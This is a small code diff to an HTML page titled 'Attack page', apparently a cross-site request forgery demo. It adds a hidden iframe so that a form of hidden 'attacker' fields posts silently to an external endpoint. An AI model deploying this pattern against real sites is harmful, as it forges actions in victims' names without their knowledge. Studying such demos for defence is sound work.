@@ -4,7 +4,9 @@
   <head>
   </head>
   <body>
-    <form action='https://quiet-eyrie-24435.herokuapp.com/api/form' method="POST">
+    <h3> Attack page </h3>
+    <iframe title="hiddenframe" id="hiddenframe" style={{ display: "none" }} />
+    <form action='https://quiet-eyrie-24435.herokuapp.com/api/form' method="POST" target="hiddenframe">
       <input type="hidden" name="attacker1" value="val1"/>
       <input type="hidden" name="attacker2" value="val2"/>
       <input type="hidden" name="attacker3" value="val3"/>
